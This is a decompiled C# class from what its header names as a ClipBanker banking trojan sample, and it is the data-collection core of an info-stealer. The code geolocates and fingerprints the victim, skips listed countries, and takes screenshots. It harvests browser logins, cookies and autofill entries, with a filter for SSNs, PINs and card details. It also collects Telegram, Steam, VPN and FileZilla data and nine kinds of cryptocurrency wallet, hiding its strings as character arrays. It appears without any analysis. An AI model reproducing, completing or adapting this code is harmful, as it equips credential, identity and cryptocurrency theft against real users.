// Decompiled with JetBrains decompiler
// Type: FtpClient.Data.Core.LogParsers.Processor
// Assembly: Baignoire, Version=12.5.1.3, Culture=neutral, PublicKeyToken=null
// MVID: 0AA7C5E4-9380-4A35-BE75-5D7E722D7BE8
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\HEUR-Trojan-Banker.MSIL.ClipBanker.gen-4d94148f1dff68b03896e3fa5508c5b039b0a29b1fd90db01884137f2e9495a4.exe

using FtpClient.Data.Applications;
using FtpClient.Data.Applications.Wallets;
using FtpClient.Data.Browsers.Chromium;
using FtpClient.Data.Browsers.Gecko;
using FtpClient.Data.Extensions;
using FtpClient.Data.Helpers;
using FtpClient.Models.Browsers;
using FtpClient.Models.Core;
using FtpClient.Models.Enums;
using FtpClient.Models.Info;
using FtpClient.Models.Serialization;
using FtpClient.Models.WMI;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Windows.Forms;

namespace FtpClient.Data.Core.LogParsers
{
  public class Processor : BaseLogParser
  {
    public override bool TryGet(InfoClass10 settings, out InfoClass1 userLog)
    {
      userLog = new InfoClass1();
      try
      {
        Processor.FirstStage(settings, ref userLog);
        Processor.SecondStage(settings, ref userLog);
        Processor.ThirdStage(settings, ref userLog);
        userLog.ReplaceEmptyValues();
        return true;
      }
      catch (Exception ex)
      {
        return false;
      }
    }

    private static void SecondStage(InfoClass10 settings, ref InfoClass1 userLog)
    {
      try
      {
        userLog.Object1 = CryptoHelper.GetMd5Hash(Environment.UserDomainName + Environment.UserName + SystemInfoHelper.GetDiskDrive().SerialNumber).Replace("-", string.Empty);
        if (settings.Object7)
          userLog.Object14 = DisplayHelper.GetScreenshot();
        userLog.Object6 = InputLanguage.CurrentInputLanguage.Culture.EnglishName;
        userLog.Object12 = TimeZoneInfo.Local.DisplayName;
        Size displayResolution = DisplayHelper.GetDisplayResolution();
        userLog.Object7 = string.Format("{0}x{1}", (object) displayResolution.Width, (object) displayResolution.Height);
        userLog.Object15 = new InfoClass7()
        {
          Object1 = SystemInfoHelper.GetUserAgents(settings).FirstOrDefault<string>().IsNull("UNKNOWN")
        };
        userLog.Object4 = false;
        userLog.Object5 = SystemInfoHelper.GetWindowsVersion();
        userLog.Object3 = Environment.UserName;
      }
      catch
      {
      }
    }

    private static void FirstStage(InfoClass10 settings, ref InfoClass1 userLog)
    {
      try
      {
        GeoInfo geoInfo = GeoHelper.Get();
        geoInfo.IP = string.IsNullOrWhiteSpace(geoInfo.IP) ? "UNKNOWN" : geoInfo.IP;
        geoInfo.Location = string.IsNullOrWhiteSpace(geoInfo.Location) ? "UNKNOWN" : geoInfo.Location;
        geoInfo.Country = string.IsNullOrWhiteSpace(geoInfo.Country) ? "UNKNOWN" : geoInfo.Country;
        geoInfo.PostalCode = string.IsNullOrWhiteSpace(geoInfo.PostalCode) ? "UNKNOWN" : geoInfo.PostalCode;
        List<string> object12 = settings.Object12;
        // ISSUE: explicit non-virtual call
        if (object12 != null && __nonvirtual (object12.Count) > 0 && settings.Object12.Contains(geoInfo.Country))
          throw new InvalidOperationException();
        List<string> object13 = settings.Object13;
        // ISSUE: explicit non-virtual call
        if (object13 != null && __nonvirtual (object13.Count) > 0 && settings.Object13.Contains(geoInfo.IP))
          throw new InvalidOperationException();
        userLog.Object13 = geoInfo.IP;
        userLog.Object11 = geoInfo.Location;
        userLog.Object10 = geoInfo.Country;
        userLog.Object17 = geoInfo.PostalCode;
      }
      catch
      {
      }
    }

    private static void ThirdStage(InfoClass10 settings, ref InfoClass1 userLog)
    {
      try
      {
        userLog.Object9 = new InfoClass8()
        {
          Object1 = new List<string>(),
          Object6 = new List<InfoClass12>(),
          Object9 = new List<InfoClass3>(),
          Object7 = new List<InfoClass4>(),
          Object5 = new List<InfoClass6>(),
          Object8 = new List<InfoClass5>(),
          Object3 = new List<string>(),
          Object2 = new List<string>(),
          Object4 = new List<string>(),
          Object11 = new List<InfoClass9>(),
          Object12 = new List<InfoClass11>(),
          Object10 = new List<InfoClass3>(),
          Object13 = new List<InfoClass4>(),
          Object14 = new List<InfoClass3>(),
          Object15 = new List<InfoClass3>(),
          Object16 = new List<InfoClass3>()
        };
        foreach (WmiProcessor processor in SystemInfoHelper.GetProcessors())
          userLog.Object9.Object5.Add(new InfoClass6()
          {
            Object1 = processor.Name,
            Object3 = HardwareType.Processor,
            Object2 = processor.NumberOfCores.ToString()
          });
        foreach (WmiGraphicCard wmiGraphicCard in SystemInfoHelper.GetGraphicCards().Where<WmiGraphicCard>((Func<WmiGraphicCard, bool>) (x => x.AdapterRAM > 0U)))
          userLog.Object9.Object5.Add(new InfoClass6()
          {
            Object1 = wmiGraphicCard.Name,
            Object3 = HardwareType.Graphic,
            Object2 = wmiGraphicCard.AdapterRAM.ToString()
          });
        userLog.Object9.Object5.Add(new InfoClass6()
        {
          Object1 = new string(new char[12]
          {
            'T',
            'o',
            't',
            'a',
            'l',
            ' ',
            'o',
            'f',
            ' ',
            'R',
            'A',
            'M'
          }),
          Object3 = HardwareType.Graphic,
          Object2 = SystemInfoHelper.TotalOfRAM()
        });
        userLog.Object9.Object1 = SystemInfoHelper.SystemDefenders();
        userLog.Object9.Object8 = SystemInfoHelper.GetBrowsers();
        userLog.Object9.Object4 = SystemInfoHelper.ListOfProcesses();
        userLog.Object9.Object3 = SystemInfoHelper.ListOfPrograms();
        userLog.Object9.Object2 = SystemInfoHelper.AvailableLanguages();
        if (settings.Object8)
          userLog.Object9.Object16.AddRange((IEnumerable<InfoClass3>) TG.GetFiles());
        if (settings.Object9)
        {
          userLog.Object9.Object13.AddRange((IEnumerable<InfoClass4>) NVPN.GetProfile());
          userLog.Object9.Object14.AddRange((IEnumerable<InfoClass3>) OpenVPN.ParseFiles());
          userLog.Object9.Object15.AddRange((IEnumerable<InfoClass3>) ProtonVPN.ParseFiles());
        }
        if (settings.Object10)
          userLog.Object9.Object10.AddRange((IEnumerable<InfoClass3>) SG.GetFiles());
        if (settings.Object1)
        {
          List<InfoClass12> infoClass12List = new List<InfoClass12>();
          List<string> profiles = new List<string>();
          List<string> paths = new List<string>();
          foreach (string chromiumBrowserPath in Constants.chromiumBrowserPaths)
          {
            try
            {
              string empty = string.Empty;
              string path1 = !chromiumBrowserPath.Contains(new string(new char[5]
              {
                'O',
                'p',
                'e',
                'r',
                'a'
              })) ? Constants.LocalAppData + chromiumBrowserPath : Constants.RoamingAppData + chromiumBrowserPath;
              if (Directory.Exists(path1))
              {
                string baseDirectory = path1;
                string[] strArray = new string[3]
                {
                  new string(new char[10]
                  {
                    'L',
                    'o',
                    'g',
                    'i',
                    'n',
                    ' ',
                    'D',
                    'a',
                    't',
                    'a'
                  }),
                  new string(new char[8]
                  {
                    'W',
                    'e',
                    'b',
                    ' ',
                    'D',
                    'a',
                    't',
                    'a'
                  }),
                  new string(new char[7]{ 'C', 'o', 'o', 'k', 'i', 'e', 's' })
                };
                foreach (string path2 in FileSystemHelper.FindPaths(baseDirectory, 1, 1, strArray))
                {
                  if (!profiles.Contains(path2))
                    profiles.Add(path2);
                }
              }
            }
            catch
            {
            }
          }
          foreach (string geckoBrowserPath in Constants.geckoBrowserPaths)
          {
            try
            {
              string path3 = Constants.RoamingAppData + geckoBrowserPath;
              if (Directory.Exists(path3))
              {
                string baseDirectory = path3;
                string[] strArray = new string[4]
                {
                  new string(new char[7]{ 'k', 'e', 'y', '3', '.', 'd', 'b' }),
                  new string(new char[7]{ 'k', 'e', 'y', '4', '.', 'd', 'b' }),
                  new string(new char[14]
                  {
                    'c',
                    'o',
                    'o',
                    'k',
                    'i',
                    'e',
                    's',
                    '.',
                    's',
                    'q',
                    'l',
                    'i',
                    't',
                    'e'
                  }),
                  new string(new char[11]
                  {
                    'l',
                    'o',
                    'g',
                    'i',
                    'n',
                    's',
                    '.',
                    'j',
                    's',
                    'o',
                    'n'
                  })
                };
                foreach (string path4 in FileSystemHelper.FindPaths(baseDirectory, 2, 1, strArray))
                {
                  if (!paths.Contains(path4))
                    paths.Add(path4);
                }
              }
            }
            catch
            {
            }
          }
          infoClass12List.AddRange((IEnumerable<InfoClass12>) ChrmBrowser.Get((IList<string>) profiles));
          infoClass12List.AddRange((IEnumerable<InfoClass12>) FF.Get((IList<string>) paths));
          IEnumerable<InfoClass11> autofills = infoClass12List.Where<InfoClass12>((Func<InfoClass12, bool>) (x => !x.IsEmpty())).SelectMany<InfoClass12, InfoClass11>((Func<InfoClass12, IEnumerable<InfoClass11>>) (x => (IEnumerable<InfoClass11>) x.Object4));
          userLog.Object9.Object6.AddRange((IEnumerable<InfoClass12>) infoClass12List);
          userLog.Object9.Object12.AddRange((IEnumerable<InfoClass11>) Processor.FindImportant(autofills));
        }
        if (settings.Object2)
          userLog.Object9.Object9 = RFG.GetFiles((IEnumerable<string>) settings.Object11);
        if (settings.Object3)
        {
          List<InfoClass4> infoClass4List = new List<InfoClass4>();
          infoClass4List.AddRange((IEnumerable<InfoClass4>) FZ.Get());
          userLog.Object9.Object7 = infoClass4List;
        }
        if (!settings.Object5)
          return;
        List<InfoClass9> infoClass9List = new List<InfoClass9>();
        infoClass9List.AddRange((IEnumerable<InfoClass9>) LocalWallets.Get((IEnumerable<IWalletParser>) new IWalletParser[9]
        {
          (IWalletParser) new Armory(),
          (IWalletParser) new Atomic(),
          (IWalletParser) new Coinomi(),
          (IWalletParser) new Electrum(),
          (IWalletParser) new Ethereum(),
          (IWalletParser) new Exodus(),
          (IWalletParser) new Guarda(),
          (IWalletParser) new Jaxx(),
          (IWalletParser) new Monero()
        }));
        foreach (InfoClass9 infoClass9 in infoClass9List)
          userLog.Object9.Object11.Add(infoClass9);
      }
      catch
      {
      }
    }

    private static List<InfoClass11> FindImportant(IEnumerable<InfoClass11> autofills)
    {
      List<InfoClass11> items = new List<InfoClass11>();
      try
      {
        if (autofills == null || autofills.Count<InfoClass11>() == 0)
          return items;
        string[] strArray = new string[12]
        {
          new string(new char[9]
          {
            'l',
            'a',
            's',
            't',
            '_',
            'n',
            'a',
            'm',
            'e'
          }),
          new string(new char[10]
          {
            'f',
            'i',
            'r',
            's',
            't',
            '_',
            'n',
            'a',
            'm',
            'e'
          }),
          new string(new char[7]{ 'a', 'd', 'd', 'r', 'e', 's', 's' }),
          new string(new char[3]{ 'd', 'o', 'b' }),
          new string(new char[5]{ 'e', 'm', 'a', 'i', 'l' }),
          new string(new char[9]
          {
            'f',
            'i',
            'r',
            's',
            't',
            'N',
            'a',
            'm',
            'e'
          }),
          new string(new char[8]
          {
            'l',
            'a',
            's',
            't',
            'N',
            'a',
            'm',
            'e'
          }),
          new string(new char[3]{ 's', 's', 'n' }),
          new string(new char[3]{ 'p', 'i', 'n' }),
          new string(new char[8]
          {
            's',
            'e',
            'c',
            'u',
            'r',
            'i',
            't',
            'y'
          }),
          new string(new char[10]
          {
            'e',
            'x',
            'p',
            'i',
            'r',
            'e',
            'D',
            'a',
            't',
            'e'
          }),
          new string(new char[14]
          {
            'e',
            'x',
            'p',
            'i',
            'r',
            'a',
            't',
            'i',
            'o',
            'n',
            'D',
            'a',
            't',
            'e'
          })
        };
        foreach (InfoClass11 autofill in autofills)
        {
          foreach (string str in strArray)
          {
            if (autofill.Object1.Contains(str))
            {
              items.Add(autofill);
              break;
            }
          }
        }
      }
      catch
      {
      }
      return items.DistinctBy<InfoClass11, string>((Func<InfoClass11, string>) (x => x.Object2)).IsNull<IEnumerable<InfoClass11>>((IEnumerable<InfoClass11>) new List<InfoClass11>()).ToList<InfoClass11>();
    }
  }
}
